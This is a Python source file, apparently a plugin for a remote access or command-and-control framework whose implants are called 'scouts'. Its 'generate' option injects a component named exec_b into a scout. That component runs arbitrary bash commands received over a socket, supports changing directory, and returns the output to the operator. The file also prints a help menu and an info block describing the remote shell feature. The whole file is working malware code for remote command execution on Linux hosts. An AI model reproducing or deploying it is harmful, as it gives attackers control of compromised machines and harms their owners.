# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('from subprocess import Popen, PIPE')
        self.config.import_statements.append('from os import chdir')
        self.config.functions.append('''
def exec_b(execute):
    execute = execute.split(' ',1)[1]
    if execute[:3] == 'cd ':
        execute = execute.replace('cd ', '', 1)
        chdir(execute)
        send_all(s,"[+]Changed to directory : " + execute)
    else:
        result = Popen(execute, executable='/bin/bash', shell=True, stdout=PIPE, stderr=PIPE,
                       stdin=PIPE)
        result = result.stdout.read() + result.stderr.read()        
        send_all(s,'[+]Command output : \\n' + result.decode())''')
        self.config.logics.append('''
            elif command == "exec_b":
                exec_b(data)''')
        self.config.help_menu[
            'exec_b <shell command>'] = 'A remote shell command execution component of the scout, it allows the scout to remotely execute commands using bash shell'
    elif option == 'info':
        self.log.blank('\nName             : Execute command bash component' \
                       '\nOS               : Linux' \
                       '\nRequired Modules : subprocess' \
                       '\nCommands         : exec_b <shell command>' \
                       '\nDescription      : A remote shell command execution component of the scout, it allows the scout to remotely execute commands using bash\n')
        return {
            "Name": "Execute command bash component",
            "OS": "Linux",
            "Required Modules": "subprocess",
            "Commands": "exec_b <shell command>",
            "Description": "A remote shell command execution component of the scout, it allows the scout to remotely execute commands using bash"
        }